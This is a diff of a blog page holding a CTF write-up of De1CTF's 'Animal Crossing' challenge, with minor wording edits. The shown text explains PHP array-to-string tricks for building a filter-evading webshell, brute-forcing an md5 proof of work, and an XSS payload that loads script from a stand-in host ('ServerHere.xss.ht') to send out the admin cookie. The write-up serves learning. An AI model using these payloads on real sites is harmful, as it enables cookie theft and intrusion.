@@ -46,7 +46,7 @@
 <meta itemprop="description" content="The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.">
 <meta itemprop="datePublished" content="2020-05-07T15:20:38-06:00" />
 <meta itemprop="dateModified" content="2020-05-07T15:20:38-06:00" />
-<meta itemprop="wordCount" content="1810">
+<meta itemprop="wordCount" content="1807">
 <meta itemprop="image" content="https://jamvie.net/img/AnimalCrossing.jpg">
 <meta itemprop="image" content="https://jamvie.net/images/DE1CTF01.png">
 <meta itemprop="image" content="https://jamvie.net/images/DE1CTF02.png">
@@ -239,7 +239,7 @@ output: &#39;AA&#39;
     $result = &#39;Vie&#39;;
 }
 </code></pre></div><p>And finally, the last quirk about php: arrays and strings.</p>
-<p>In other <del>normal</del> languages, arrays and strings are treated as distinct, two different data types. Some languages may treat strings as an array of chars, but by convention, just any random and arbitrary array can&rsquo;t and shouldn&rsquo;t be joined with a string without proper typesetting and checking. Okay, sounds fair and good and all. But what does php do instead?</p>
+<p>In other languages, arrays and strings are treated as distinct, two different data types. Some languages may treat strings as an array of chars, but by convention, just any random and arbitrary array can&rsquo;t and shouldn&rsquo;t be joined with a string without proper typesetting and checking. Okay, sounds fair and good and all. But what does php do instead?</p>
 <p>In php, you can join arrays and strings together. The array will be converted to the string: <code>'Array'</code>.</p>
 <pre><code>php &gt; echo ''.[];
 PHP Notice: Array to string conversion on line 1
@@ -249,8 +249,7 @@ Array               &lt;------The string, 'Array'
 php &gt; $var = ''.[];
 php &gt; echo $var['!'=='@'];   &lt;------Should give us the first leter in 'Array'
 A
-</code></pre><p>Javascript happens to have similar function to this!</p>
-<p>What does this mean for us?</p>
+</code></pre><p>What does this mean for us?</p>
 <p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>
 <p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>[] <span style="color:#75715e">?&gt;</span>            //Declare array
@@ -296,10 +295,10 @@ But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a sh
 
 
 <p>I thought my client broke for a second. I wasn&rsquo;t expecting just plain code to be printed on the front-end.</p>
-<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was conSfused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
+<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was confused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
 <p>The good thing (in this context, bad for others) about md5 is that it&rsquo;s a one-way hashing but there is no salting to the code value, it&rsquo;s just the hash. Therefore, a string put through md5 would always return the same md5 encoding. So I just needed to randomly generate a string, md5 it, then check the digest against the random one.</p>
 <p>Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack.</p>
-<p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server. Part of my payload looks like this:</p>
+<p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server(You can use pastebin, XSSHunter, webhook.site, etc). Part of my payload looks like this:</p>
 <pre><code>data=base64DATAXXXXXXX'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://ServerHere.xss.ht\';document.body.appendChild(a)')
 </code></pre><p>And we retrieve the cookie, which has the flag:</p>
 <p><code>FLAG=De1CTF{I_l1k4_</code></p>
